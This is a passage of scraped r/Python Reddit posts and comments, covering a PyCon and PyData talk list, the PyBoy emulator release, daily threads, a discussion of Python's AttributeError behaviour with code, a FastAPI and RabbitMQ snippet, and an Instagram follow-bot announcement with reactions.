2023\" ⸱ +1k views ⸱ 00h 46m 12s\n\"Lightning Talks - April 21, 5pm\" ⸱ +1k views ⸱ 01h 04m 16s\n\"How to Leverage the Full Potential of LLMs for Your Business with Langchain - Leon Ruddat\" ⸱ +1k views ⸱ 00h 34m 40s\n\"Jay Chia & Sammy Sidhu: Daft - The Distributed Python Dataframe for Complex Data\" ⸱ +1k views ⸱ 00h 23m 01s\n\"Talks - A. Jesse Jiryu Davis: Consistency and isolation for Python programmers\" ⸱ +1k views ⸱ 00h 24m 23s\n\"\"Python deployment with Docker and Poetry\" - Cristian Heredia (PyBay 2023)\" ⸱ +1k views ⸱ 00h 12m 24s\n\"Peterson & Qin - Contextual Multi-Arm Bandit and its applications to digital experiments | PyData\" ⸱ +1k views ⸱ 00h 44m 54s\n\"Tutorials - Ron Nathaniel: How To Troubleshoot and Monitor Applications using OpenTelemetry\" ⸱ +1k views ⸱ 02h 01m 57s\n\"Keynote Speaker - Python Steering Council\" ⸱ +1k views ⸱ 00h 20m 42s\n\"An unbiased evaluation of environment management and packaging tools — Anna-Lena Popkes\" ⸱ +1k views ⸱ 00h 43m 14s\n\"Vincent Gosselin - Turning your Data/AI algorithms into full web apps in no time with Taipy\" ⸱ +1k views ⸱ 00h 38m 18s\n\"Malte Tichy - Knowing what you don’t know matters- Uncertainty-aware model rating\" ⸱ +1k views ⸱ 00h 30m 05s\n\"Talks - Andrew Godwin: Reconciling Everything\" ⸱ +1k views ⸱ 00h 30m 16s\n\"Vincent Warmerdam - Bulk Labelling Techniques\" ⸱ +1k views ⸱ 00h 32m 55s\n\"Hugo Bowne-Anderson - Full-stack Machine Learning and Generative AI for Data Scientists\" ⸱ +1k views ⸱ 01h 28m 30s\n\"J.J. Allaire - Keynote: Dashboards with Jupyter and Quarto | PyData NYC 2023\" ⸱ +1k views ⸱ 00h 40m 15s\n\"Alejandro Saucedo - Industrial Strength DALLE-E:Scaling Complex Large Text & Image Models\" ⸱ +1k views ⸱ 00h 28m 07s\n\"Subclassing, Composition, Python, and You — Hynek Schlawack\" ⸱ +1k views ⸱ 00h 44m 59s\n\"Tutorials -Zac Hatfield-Dodds, Ryan Soklaski: Introduction to Property-Based Testing\" ⸱ +1k views ⸱ 01h 31m 20s\n[**\"Furkan M. Torun - Become a Data Storyteller with Streamlit! PyData Prague 2023-11-20]\"** ⸱ +1k views ⸱ 00h 23m 26s\n\"Anna-Lena Popkes: An unbiased evaluation of environment management and packaging tools\" ⸱ +1k views ⸱ 00h 43m 53s\n\"PyData Chicago March 2023 Meetup | Monte Carlo with QMCPy for Vector Functions of Integrals\" ⸱ +1k views ⸱ 00h 46m 35s\n\"James Powell - Simple Simulators with pandas and Generator Coroutines | PyData NYC 2023\" ⸱ +1k views ⸱ 01h 21m 43s\n\"Polars is the Pandas killer / Igor Mintz (Viz.ai)\" ⸱ +1k views ⸱ 00h 21m 46s\n\"Diving into Event-Driven Architectures with Python — Marc-André Lemburg\" ⸱ +1k views ⸱ 00h 30m 59s\n\"Using Embeddings and Deep Neural Networks as a technique for AutoML Demand Forecasting PyData SW\" ⸱ +1k views ⸱ 00h 36m 06s\n\"Leland McInnes - Data Mapping for Data Exploration | PyData Seattle 2023\" ⸱ +1k views ⸱ 00h 38m 16s\n\"Eduardo Blancas - Using embedded SQL engines for plotting massive datasets on a laptop\" ⸱ +1k views ⸱ 00h 27m 00s\n\"Large Language Models: From Prototype to Production — Ines Montani\" ⸱ +1k views ⸱ 00h 40m 20s\n\"Tutorials - Pavithra Eswaramoorthy, Dharhas Pothina: Data of Unusual Size: Interactive Visualization\" ⸱ +1k views ⸱ 03h 06m 45s\n\"Moritz Meister - Data Validation for Feature pipelines: Using Great Expectations and Hopsworks\" ⸱ +1k views ⸱ 00h 27m 40s\n\"Inge van den Ende-Leveraging conformal prediction for calibrated probabilistic time series forecasts\" ⸱ +1k views ⸱ 00h 31m 33s\n\"Nick Sorros - A Tour of Large Language Models\" ⸱ +1k views ⸱ 00h 46m 38s\n\"Thomas Frauholz: From notebook to pipeline in no time with LineaPy\" ⸱ +1k views ⸱ 00h 43m 17s\n\"EuroPython 2023 Opening Session\" ⸱ +1k views ⸱ 00h 20m 58s\n\"Optimizing Ad Conversions with DS / Yael Kiselman (DigitalTurbine)\" ⸱ +1k views ⸱ 00h 51m 44s\n\"Harizo Rajaona - A Tour of the Many DataFrame Frameworks\" ⸱ +1k views ⸱ 00h 34m 59s\n\"Andrei Alekseev - Why does everyone need to develop a machine learning package?\" ⸱ +1k views ⸱ 00h 28m 07s\n\"Ties de Kok - Going beyond ChatGPT: introduction to prompt engineering & LLMs | PyData Seattle 2023\" ⸱ +1k views ⸱ 00h 59m 56s\n\"PyData Boston Sept session 1: Mike Woodward - Data sci done wrong: how/why scientists make mistakes.\" ⸱ +1k views ⸱ 00h 27m 14s\n\"Joe Cheng - Shiny: Data-centric web applications in Python | PyData Seattle 2023\" ⸱ +1k views ⸱ 00h 43m 56s\n\"Tutorials - Cheuk Ting Ho: Power up your work with compiling and profiling\" ⸱ +1k views ⸱ 01h 33m 02s\n\"Talks -Algorithmic ideas, engineering tricks, and trivia behind CPython's new sorting algorithm\" ⸱ +1k views ⸱ 00h 29m 39s\n\"Talks - Dawn Wages: Supercharge your Python Development Environment with VS Code + Dev Container\" ⸱ +1k views ⸱ 00h 31m 01s\n\"Egor Romanov - Performance of Vector Databases\" ⸱ +1k views ⸱ 00h 43m 09s\n\"Alexander CS Hendorf - Ten Years of Community Organizer | PyData NYC 2023\" ⸱ +1k views ⸱ 00h 42m 41s\n\"Talks - Nicholas H.Tollervey, Paul Everitt: Build Yourself a PyScript\" ⸱ +1k views ⸱ 00h 39m 28s\n\"Emil Rijcken - FuzzyTM: a Python package for fuzzy topic models\" ⸱ +1k views ⸱ 00h 28m 12s\n\"Nikolas Markou - Artificial Intelligence for Vision: A walkthrough of recent breakthroughs\" ⸱ +1k views ⸱ 00h 42m 10s\n\"Would Rust make you a better Pythonista? — Alexys Jacob\" ⸱ +1k views ⸱ 00h 47m 23s\n\"Simon Pressler: Getting started with JAX\" ⸱ +1k views ⸱ 00h 29m 49s\n\"Sponsor Presentation - How to build stunning Data Science Web applications in Python\" ⸱ +1k views ⸱ 00h 54m 10s\n\"Pavel Pleskov - All about ML competitions!\" ⸱ +1k views ⸱ 01h 03m 13s\n\"Laszlo Sragner - Code Smells in Data Science: What can we do about them? | PyData London 2023\" ⸱ +1k views ⸱ 00h 39m 19s\n\"Talks - Jodie Burchell: Vectorize using linear algebra and NumPy to make your Python code fast\" ⸱ +1k views ⸱ 00h 28m 32s\n\"Comparing Elixir and Python when working with Simple Neural Networks - A. Neto & L. C. Tavano\" ⸱ +1k views ⸱ 00h 38m 11s\n\"Talks - Valerio Maggio: Pythonic functional (iter)tools for your data challenges\" ⸱ +1k views ⸱ 00h 32m 38s\n\"Topaz Gilad - Classification Through Regression:Unlock the True Potential of Your Labels\" ⸱ +1k views ⸱ 00h 28m 13s\n\"Running Python packages in the browser with Pyodide — Roman Yurchak\" ⸱ +1k views ⸱ 00h 27m 49s\n\"J.J. Allaire - Publishing Jupyter Notebooks with Quarto | PyData Seattle 2023\" ⸱ +1k views ⸱ 00h 40m 47s\n\"ipyvizzu-story- a open-source tool to build create+share animated data stories w/ python in jupyter\" ⸱ +1k views ⸱ 01h 25m 54s\nDue to Reddit post length limit, see the remaining talks in this post or google sheet.",
    "comments": []
},
{
    "post_author": "baekalfen",
    "post_id": "g484d4",
    "post_score": "1745",
    "post_time": "Sunday, April 19, 2020 at 5:01:05 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Today I’m releasing PyBoy v1.0.0! A Game Boy emulator written in Python, focused on scripting, AI and learning",
    "media": [
        "https://i.imgur.com/jEpnRRz.gifv",
        "https://github.com/Baekalfen/PyBoy/wiki/Installation",
        "https://i.imgur.com/nr9VWwe.gifv",
        "https://github.com/Baekalfen/PyBoy",
        "https://docs.pyboy.dk/"
    ],
    "post_content": "Back in 2015, it started as a university project. But I’ve kept working on it, and others have started contributing as well over the years. Today we thought it was time to officially release PyBoy v1.0.0 on PyPi and GitHub!\nhttps://github.com/Baekalfen/PyBoy\n0:00\n0:00\n/\n0:10\nhttps://i.imgur.com/jEpnRRz.gifv\nWhat is PyBoy\nIn short, it’s a Game Boy emulator written from scratch in pure Python, with additional support for scripting through an API. We’ve added type definitions, which allows us to compile the software using Cython to get performance comparable to emulators written in C and C++.\nInstallation\nThe installation instructions are simple: Install SDL2 on your system, and install PyBoy through pip install pyboy. If you need to compile from source, we also have detailed instructions on the GitHub Wiki for Mac, Linux and Windows.\nhttps://github.com/Baekalfen/PyBoy/wiki/Installation\nFeatures\nPyBoy is designed to be accessible from Python, so we support and encourage people who want to make experiments, bots or AI’s to try it out. We are building game-specific wrappers, which at the moment allows programmers to interface with Tetris and Super Mario Land, without any intricate knowledge of the Game Boy. Documentation can be found at: https://docs.pyboy.dk .\nWe also want to learn and experiment with more exotic features. Based on work from a university project, we’ve added rewinding to the emulator. Which means, you’ll be able to turn back time in any game.\n0:00\n0:00\n0:00\nhttps://i.imgur.com/nr9VWwe.gifv\nFeedback, Contribute, Learn\nWe’d love to hear your feedback, and see the projects you wish to use PyBoy for! We will do our best to make it happen.\nPlease give any feedback in the comments below, on our Discord server or create issues/pull-requests on GitHub if you wish.",
    "comments": [
        {
            "author": "PirateNinjasReddit",
            "score": "187",
            "content": "We used your emulator for a company hackday. Thanks for all your work on this!",
            "replies": [
                {
                    "author": "baekalfen",
                    "score": "68",
                    "content": "Glad you liked it! What did you make?",
                    "replies": [
                        {
                            "author": "PirateNinjasReddit",
                            "score": "87",
                            "content": "We had a load of teams making bots to play super Mario, with varying degrees of success! It was good fun either way."
                        }
                    ]
                },
                {
                    "author": "orionsgreatsky",
                    "score": "4",
                    "content": "Amazing"
                }
            ]
        },
        {
            "author": "grungi_ankhfire",
            "score": "26",
            "content": "This is awesome! I have been working on a long-term project to extract a lot of information on a very obscure JRPG (Jungle Wars). I will definitely check into making a plugin for this, seems like it could really make me save a bunch of time... One thing I am looking into is extracting the while overworld map, so I am curious if I can access the screen content from your API to save ot somehow ? Thanks for sharing this anyway!"
        },
        {
            "author": "Wirebraid",
            "score": "9",
            "content": "Amazing, I always wanted to peek inside an emulator, but other languaje based ones were confusing. I will play and tinker with yours!"
        },
        {
            "author": "TotesMessenger",
            "score": "15",
            "content": "I'm a bot, bleep, bloop. Someone has linked to this thread from another place on reddit: [r/emudev] Today I’m releasing PyBoy v1.0.0! A Game Boy emulator written in Python, focused on scripting, AI and learning If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads. (Info / ^Contact)"
        },
        {
            "author": "itb206",
            "score": "15",
            "content": "This is sick!"
        },
        {
            "author": "ahadcove",
            "score": "6",
            "content": "This is amazing, thank you! Already working on a project using it"
        },
        {
            "author": "desertfish_",
            "score": "10",
            "content": "Very nice, although most of it seems to be written in cython?"
        },
        {
            "author": "LetsSynth",
            "score": "5",
            "content": "Maybe it’s time to try out micropython on one of my Teensy 4.0’s and see if I can catch ‘em all"
        },
        {
            "author": "[deleted]",
            "score": "7",
            "content": "Awesome project. What drove the decision to not use C/C++ API calls? Are you emphasizing ease of use for machine learning libraries while giving up pure emulator performance? EDIT: Words"
        },
        {
            "author": "carmelolg",
            "score": "3",
            "content": "Awesome! You're amazing :)"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c3g0pc",
    "post_score": "3",
    "post_time": "Sunday, April 14, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Rumetheus",
            "score": "5",
            "content": "Developing an idea make an automated watering system for my garden with python and an Arduino/RaspberryPI (and things like soil moisture meter, weather info, etc). In the early learning stage of Arduino programming."
        },
        {
            "author": "yogeshkd",
            "score": "4",
            "content": "Adding an AI assistant to the online Python playground I'm building: https://python-fiddle.com/"
        },
        {
            "author": "Jitsu4",
            "score": "2",
            "content": "Not necessarily looking to become a big-league programmer, but taking college classes for IT/CySec and one of the courses is an intro to Python programming. I get a lot of enjoyment out of it and I look forward to continuing little projects here and there to develop my skills."
        },
        {
            "author": "theogognf",
            "score": "2",
            "content": "Trying to improve the docs for two projects: financial data aggregator and high-throughput reinforcement learning (RL). The financial docs are OK I think, but I've gotten some feedback that it's hard to figure out how to do very common tasks. The RL docs are basically non-existent lol, so probably most of my time will be dedicated to that"
        },
        {
            "author": "Raphy_69",
            "score": "2",
            "content": "I am developing a chess algorithm in python",
            "replies": [
                {
                    "author": "Raphy_69",
                    "score": "1",
                    "content": "I am using some Arduino electrical components but I wonder how I could combine my chess algorithm in python with my Arduino sketch in C++, if anybody that has an idea please reply to this comment I am open to any suggestion",
                    "replies": [
                        {
                            "author": "EternityForest",
                            "score": "1",
                            "content": "You could have the Python run on a laptop or a pi, and send commands via USB to the Arduino?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "EternityForest",
            "score": "2",
            "content": "I discovered https://github.com/treyhunner/dramatic and spent an hour or two writing a PR(not reviewed yet, I'm sure it needs work) to vary the simulated typing speed in a natural looking way. Definitely one of the more fun small projects I've done recently! My feature-deleting spree continues on my Kaithem home automation server project. With 0.79.0 I think it will be pretty much fully cleaned, and ready to start slowly re-adding a few things in a more modular, less hacky way. Full boot time is now around 10 seconds, mostly setting up an RTSP connection for the NVR feature. Pretty much all the bizarreness is gone from the install process, you just clone and pipx, so it should be PyPi-able. It's usable without writing any code, and there's integration tests for most of the core features. I'm using GitFlow, I moved to Poetry rather than a custom script to manage frozen dependencies, the custom time parser library is gone, there's work to allow automated documentation, plus way more handwritten docs with screenshots. Lots of files have been moved to Core Plugins, so there's at least a little looser coupling. I went through more ancient code with MyPy and found a few bugs along the way. And I made a bunch of 88x31 badges for the repo. Like in the old Geocities days! So much more fun than the normal badge APIs, at least for static stuff!"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Just getting started on learning python, so I'll for sure be asking a ton of questions. I just ask you all to be patient with my n00b inquiries."
        },
        {
            "author": "Civil-Bee-f",
            "score": "1",
            "content": "I've just started with data analysis using scikit-learn. Already tried to find clusters. The next step is classification. Enjoying it very much"
        },
        {
            "author": "the1024",
            "score": "1",
            "content": "working on bridge, a python package for automatic infrastructure for Django! https://github.com/Never-Over/bridge Would love for anyone to check it out :)"
        },
        {
            "author": "the1024",
            "score": "1",
            "content": "chatpdb - gpt for your python debugger! https://github.com/Never-Over/chatpdb"
        },
        {
            "author": "Gispry",
            "score": "1",
            "content": "I just finished building a python bridge code that uses the unoffical SunoAI-API to generate songs that play automatically through VLC Media Player when twitch chat redeems a channel point redemption to make it happen. I am very new to coding and am pretty proud that I managed to get this working. All of the complicated stuff was done by the actually intelligent people that made the api and I just wrote code that uses their work but I am still happy I got it working. Hoping to one day get good enough to be the one building the apis but for now I am just learning the basics."
        },
        {
            "author": "Ancient-Ad5734",
            "score": "1",
            "content": "I currently work on a Web scraping project using Python, nothing fancy actually"
        },
        {
            "author": "GoldenTreasure1",
            "score": "1",
            "content": "further learning how to code in python"
        },
        {
            "author": "s1d400",
            "score": "1",
            "content": "I'm developing a python application to get binary options signals from telegram groups and automatically enter into operations on quotex. Currently running into some issues but the base architecture of the application is laid down. If anyone is interested, I definitely need some help to finish this application. Here's the GitHub repo for this project https://github.com/s1d40/telegram-qxbroker-bot"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1c10p5r",
    "post_score": "1",
    "post_time": "Thursday, April 11, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "Dangerous_Law1678",
    "post_id": "1c5ixdz",
    "post_score": "5",
    "post_time": "Tuesday, April 16, 2024 at 6:27:59 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Question: Tool for editing figures in Python",
    "media": [
        "https://ibb.co/qY9Xk01"
    ],
    "post_content": "So I'm trying to switch from MATLAB to Python for my numerical simulations.\nOne of the things I like about MATLAB is the ability to edit figures by adding stuff (eg arrows, lines, text ... ) to the figure within the software itself. This is what I mean. It's a very handy tool in my line of work and I use it often.\nI was wondering if there's any similar tool for Python. I use matplotlib and seaborn. Any suggestions would be great. Thanks guys!",
    "comments": [
        {
            "author": "_besten",
            "score": "4",
            "content": "For interactive plotting, I would suggest using jupyter notebooks and checkout cufflinks /plotly"
        },
        {
            "author": "AWiselyName",
            "score": "3",
            "content": "I use matplotlib a lots and it's enough for most plotting data I guess. If you want to plot to browser, you can use boker instead."
        },
        {
            "author": "TheZan94",
            "score": "2",
            "content": "Seaborn, plotly, matplotlib are yoir best bets. Also if you like the matlab interface i highly recommend Spyder as editor"
        },
        {
            "author": "annonymus6598",
            "score": "2",
            "content": "matplotlib, numpy."
        },
        {
            "author": "sybarite86",
            "score": "2",
            "content": "Moving from MatLab’s GUI to matplotlib’s code-first approach is definitely a downgrade in user experience. Seaborn, plotnine, jupyter bridge the gap, but not completely and there will always be something that’s not quite right for which you need to hunt down the specific code that you need to use. What helped for me was to switch mindsets to minimal unornamented plots, and to find a good visual theme that works for you and sticking with it. The working style you describe (adding lines, text, etc willy nilly) will only bring you pain when replicating in Python."
        },
        {
            "author": "scrubking101",
            "score": "1",
            "content": "You can do all of that in matplotlib with code. Chatgpt will get you sorted."
        }
    ]
},
{
    "post_author": "Hatteras-",
    "post_id": "1c435zw",
    "post_score": "21",
    "post_time": "Sunday, April 14, 2024 at 11:21:04 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Behavior of AttributeError in @property and __getattr__",
    "media": [],
    "post_content": "I'm sure that many people have encountered the following (code for reproduction below) behavior: if during the execution of `@property`, an `AttributeError` is raised and the same class implements `__getattr__` then `__getattr__` is invoked with the name of the property resulting in a confusing message: `AttributeError: 'Foo' object has no attribute 'something'`. If we remove `__getattr__` then we get a more meaningful and correct message: `AttributeError: 'Foo' object has no attribute 'bar'`.\nfrom dataclasses import dataclass\n\n@dataclass\nclass Foo: val = 'foo_value'\n\nclass Test: \n    def __init__(self): \n        self.foo = Foo()\n\n    def __getattr__(self, name):\n        return getattr(self.foo, name)\n    \n    @property\n    def something(self):\n        return self.foo.bar\n\nt = Test() t.something\nThe error message is misleading and the behavior catches many people (myself including) in surprise and results in many wasted hours of debugging. I've seen people recommend using a custom decorator (instead of `@property` that catches attribute error) or wrapping your `@property` bodies in `try/except`. But it seems to me that this should be dealt with on language level.\nI'm trying to understand a few things:\nIs this behavior in Python intentional (i.e. is there a good reason) or just stems from the fact that `__getattr__` is invoked when `AttributeError` is raised when an instance attribute is accessed?\nIf not intentional, is there a relatively easy way to detect `AttributeErrors` cause by `@property` execution in CPython? If so, why hasn't this been handled on language level?\nI've searched CPython issues on Github and I saw someone trying to correct documentation but couldn't find issues asking about this behavior or suggestions to fix - am I missing something?",
    "comments": [
        {
            "author": "fortunatefaileur",
            "score": "25",
            "content": "in reality, you should just not use __getattr__ nearly as often as people who have just discovered it always want to do, and this case is merely a bug in your code that you should not introduce and/or have a test for, so the practical problem is extremely rare. as to what's happening: https://stackoverflow.com/questions/32191405/attributeerror-and-lost-exception-message",
            "replies": [
                {
                    "author": "Adrewmc",
                    "score": "2",
                    "content": "This is the correct answer. When using @property you are saying this attribute has a specific getter and setter (and delete function). I have a reason for changing from the norm. And those are handled as coded @property #getter def attr(self): return self._attr @attr.setter def attr(self, data): self._attr = data Python naturally comes with setters and getters, by sometime those need to be changed. class classHero: @property #getter def heath(self): return self._HP @health.setter def health(self, num ): if num < 0: self._HP = 0 elif num > self.max_hp: self._HP = self.max_hp else: self._HP = num I use a similar format to put images into a the format I want in code often. Set as path return as binary thing at path. .jog, .png. .gif etc So now the class checks if the HP is above max. So now when hero = classHero(user) print(hero.health) >>>100 hero.health -= 20 print(hero.health) >>>80 hero.health += 70 print(hero.health) >>>100 The health never overflows, and a lot of different object are loaded this way. __getattr__ Is something you should have much more familiarity with Python before you over write. I 100% agree this dunder should not generally be touched because @property exists to make those exceptions.",
                    "replies": [
                        {
                            "author": "Hatteras-",
                            "score": "1",
                            "content": "Be that as it may... Why not remove odd behavior, if relying on odd behavior is considered bad practice. I believe this exact behavior (AttributeError from getter reaching __getattr__) isn't solving any special problems so why not make the language itself safer and easier to use? I would understand if it was solving some special problem or making the language more powerful but I believe everything that it could be used for, can be handled in better ways. So I generally don't understand the design choice.",
                            "replies": [
                                {
                                    "author": "Adrewmc",
                                    "score": "1",
                                    "content": "Because some of the times __getattr__ can be written in C… but we want getattr() to work for everything. Sometimes the @property is written in C. As you can see the regular __getattr__ produces the correct error this is built in as well. Generally speaking dunder behavior is what Python expects normally, if we need to change that then we can, however changing certain ones can be tricker then others for example, we overwrite __init__ naturally that most people don’t even realize your overwriting anything at all. But we have it has a dunder because __init__ is usually called at class creation so we want to ensure it exists regardless. By using @property you make a specific getter for that attribute while leaving the rest of the attributes to function as normal, this would be complicated to do correctly yourself, by changing __getattr__ you change how all attributes will be gotten in the entire class. This is why using it is important because generally speaking we will only want to change the behavior of certain attributes not all of them at once. If you need to change the behaviors of all of them then normally you are writing in C, and thus that will need to function with the __getattr__ hook in Python to access the dot operators as you would expect it. Since __getattr__ it can do a lot of base level functionality you have to remember inside the class your also overwriting all of the __getatrr__ for inherited classes, and that will start to get messy. So here when you call res = t.something You actually go res = t.__getattr__(“something”) Which in your code will GOTO res = getattr(t.foo, “something”) Which goes res = foo.__getattr__(“something”) Which ends __main__.__setattr__(“res”, t.__getattr__(t._getattr__(“foo”).__getattr__(“something”))) Or something up there in namespace. I generally don’t want to write code like that do you? I much rather prefer the top one. But I like understanding that I can actually adjust those in specific scenarios and by knowing that I think it clear…I sort of don’t want to mess around too much with those ones. I want that stuff to just work. And foo has no attribute something and the entire class has broken you can’t access any of the base attributes. And thus your error was correct, as it never got to even asking about .bar that part never ran."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "Hatteras-",
                    "score": "0",
                    "content": "The bug is indeed in \"my\" code but the exception message is misleading is what I'm trying to express. I understand that `__getattr__` will be invoked when `AttributeError` is raised on an actual attribute but should that be the same for `AttributeError` raised inside `@property`? After all, `@property` definitely exists on the class.",
                    "replies": [
                        {
                            "author": "danted002",
                            "score": "6",
                            "content": "I’m not sure I understand your dilemma on the issue. The interpreter tried accessing an attribute on an object and received an AttributeError so it invoked the __getattr__ method on said object. This is the expected behaviour as described by the documentation. Why would the interpreter care what or why the AttributeError got raised? If you want the behaviour you described just catch the AttributeError in your @property or just don’t use __getattr__. Is there a particular reason you need both @property and getattr? I would also recommend reading the Zen of Python and some idiomatic python articles because this is the first time I see code like this in 13 years of writing Python and I’m somewhat confused on why someone would complicate the codebase like this.",
                            "replies": [
                                {
                                    "author": "Hatteras-",
                                    "score": "1",
                                    "content": "I have a specific use case of proxying an object but also directly exposing some deeper attributes directly (transforming data for API response) but that is besides the point. I don't think this specifically \"complicates\" a codebase and I would argue Python's behavior is complicated here. My dilemma is that the initially raised Exception is **not** for an attribute of the current class. Again, I understand why this is happening and I also understand there is difference in processing functions and properties and attributes but you wouldn't expect to have a lookup reach `__getattr__` if an `AttributeError` is raised inside a method call? (again, I understand there is a difference between method call and attribute access but there's also difference between attribute access and `@property` access. I don't believe the Zen of Python or idiomatic articles have anything to do with this discussion."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "lfdfq",
            "score": "13",
            "content": "In a sense, trying to access an attribute and it raising AttributeError is the definition of the attribute not existing. It's not really special about property, but all of the attribute accessing machinery. Trying to access t.something and it raising an AttributeError means that the \"something\" attribute doesn't exist, and so that's why getattr was invoked. I think this is probably working exactly as intended.",
            "replies": [
                {
                    "author": "Hatteras-",
                    "score": "1",
                    "content": "When an `AttributeError` is raised inside `@property`, at least in my example, the exception is for `self.foo.bar` not `self.something` or `t.something`. If this specific behavior (regarding `@property` not the general `AttributeError` and `__getattr__`) was intended then would you rely on this behavior - i.e. `t.something` raising AttributeError and expecting `__getattr__` to handle it? I suppose if `self.foo.something` existed then the code would work but I doubt I'd write code like that even when I know exactly how it works."
                }
            ]
        }
    ]
},
{
    "post_author": "Accembler",
    "post_id": "1c33ku8",
    "post_score": "15",
    "post_time": "Saturday, April 13, 2024 at 5:43:59 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Using FastAPI REST along with RabbitMQ",
    "media": [],
    "post_content": "I have searched for a workable solution for the marriage of FastAPI async REST with RabbitMQ async interop in one application. Here is a fully workable code I came up with (intentionally simplified).\nclass MessageBrokerManager:\n    async def consume(self, loop):\n        try:\n            pika.BlockingConnection(\n                parameters=pika.ConnectionParameters(\n                    host=self._host,\n                    port=self._port,\n                    credentials=pika.PlainCredentials(\n                        username=self._username,\n                        password=self._password,\n                    ),\n                )\n            )\n        except Exception as e:\n            log_info_fail(\"Failed to connect to RabbitMQ\")\n            # return empty task\n            return asyncio.create_task(asyncio.sleep(0))\n\n        self._connection = await connect_robust(\n            host=self._host,\n            port=self._port,\n            login=self._username,\n            password=self._password,\n            loop=loop,\n        )\n\n        self._channel = await self._connection.channel()\n        queue = await self._channel.declare_queue(self._queue_name, durable=True)\n        await queue.consume(callback=MessageBrokerManager.on_message, no_ack=True)\n\n        return self._connection\n\n\n@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    try:\n        loop = asyncio.get_running_loop()\n        task = loop.create_task(MessageBrokerManager().consume(loop))\n        await task\n    except Exception as e:\n        pass\n    yield\n\napp = FastAPI(lifespan=lifespan)\napp.include_router(some_rest_router)\nDependencies:\npika>=1.3.2\naio-pika>=9.4.1\nfastapi==0.109.2",
    "comments": [
        {
            "author": "konderak",
            "score": "6",
            "content": "Ooo, that's nice - at work I have some blocking subscribers that use pika, so it's nice to see how to go about integrating it with fastapi. You might be interested checking out faststream library - used it to create small service with rabbit recentely and it's pretty nice. There's also integration with fastapi and other frameworks."
        },
        {
            "author": "AstronomerTerrible49",
            "score": "1",
            "content": "you might make it a function or save those connections as attributes of your class then make it a singleton . Also. Don’t forget to clean up",
            "replies": [
                {
                    "author": "Accembler",
                    "score": "2",
                    "content": "Yes, this code is a reference, not a copy-paste example"
                }
            ]
        },
        {
            "author": "Informal-Victory8655",
            "score": "1",
            "content": "u/Accembler hi, thanks for code. any good tutorial for that?"
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "gd8cze",
    "post_score": "1826",
    "post_time": "Monday, May 4, 2020 at 12:23:08 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made this robust Instagram Bot that checks who’s not following you back, mass follows & unfollows people on your behalf at a safe rate for organic growth. This Bot imitates a human-like behavior by randomizing time between actions. Check comments.",
    "media": [
        "https://external-preview.redd.it/QaOC5BJ7hFq3IrngK3aXfF1UcQamJZW0Z_lF8_9JSwo.png?width=640&crop=smart&format=pjpg&auto=webp&s=ae50e98781091f986a592e987e6a38cda2e71af4"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "althaj",
            "score": "576",
            "content": "This is why I utterly hate Instagram.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "117",
                    "content": "This is why I utterly hate people.* ftfy. Joking. Kind of. This thread just made me realise that all those self-promoting comments on youtube are probably bots rather than someone copy and pasting a comment. This kind of invasive spamming mentality people have is the main reason I'd have to think twice about getting a neural implant (assuming the implant process itself was perfectly safe)..",
                    "replies": [
                        {
                            "author": "beautyinthebeast",
                            "score": "59",
                            "content": "...you... weren’t planning on thinking twice about that??"
                        },
                        {
                            "author": "fistfightingthefog",
                            "score": "11",
                            "content": "You're actually the only real person on this site, have been for years."
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "119",
                    "content": "I agree! But that’s the case with every social media platform mate! Also programming and automating such stuff comes in handy for learning cool things and personal benefit right?",
                    "replies": [
                        {
                            "author": "trusk89",
                            "score": "19",
                            "content": "I cant learn Any new language without doing an automation project."
                        },
                        {
                            "author": "FauxReal",
                            "score": "5",
                            "content": "But what useful information are you getting out of it by removing the social from social media and not even looking at it? Culturally it's bankrupt. Perfect for narcissists though. But I totally get the point of automating things for fun."
                        },
                        {
                            "author": "lmericle",
                            "score": "11",
                            "content": "Your solipsistic approach blinds you from the broader consequences of your actions. Everything is connected and you have influence over what you contribute to the world."
                        }
                    ]
                },
                {
                    "author": "AissySantos",
                    "score": "5",
                    "content": "The you haven't seen twitter ;)",
                    "replies": [
                        {
                            "author": "althaj",
                            "score": "2",
                            "content": "I use twitter every day and never noticed such a problem."
                        }
                    ]
                },
                {
                    "author": "RealCyGuy",
                    "score": "5",
                    "content": "here is link because this is most popular comment: https://github.com/Harshp20/InstagramBot_Beta"
                }
            ]
        },
        {
            "author": "ThisIsAwesome_",
            "score": "84",
            "content": "Great work OP! I wrote a python script to automate posting on my Instagram page and I know how difficult it is to work with Instagram. Since there is no API support for non-business accounts it is really tough to automate things on Insta. I used selenium too, it requires a lot of code and testing to close all the random popups, making sure to log in properly and selecting correct elements."
        },
        {
            "author": "ioanciuta",
            "score": "70",
            "content": "Just test it now and looks pretty good to be honest. Well done.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "26",
                    "content": "Well I really appreciate that! Thanks mate!🙌🏻"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "99",
            "content": "UPDATE: Added support for 2-Factor Authentication. Do read the README. The GitHub link seems to be lost in the comments, https://github.com/Harshp20/InstagramBot_Beta"
        }
    ]
},
{
    "post_author": "Neustradamus",
    "post_id": "1c0kd2z",
    "post_score": "8",
    "post_time": "Wednesday, April 10, 2024 at 3:28:06 PM GMT+3",
    "flair_text": "News",
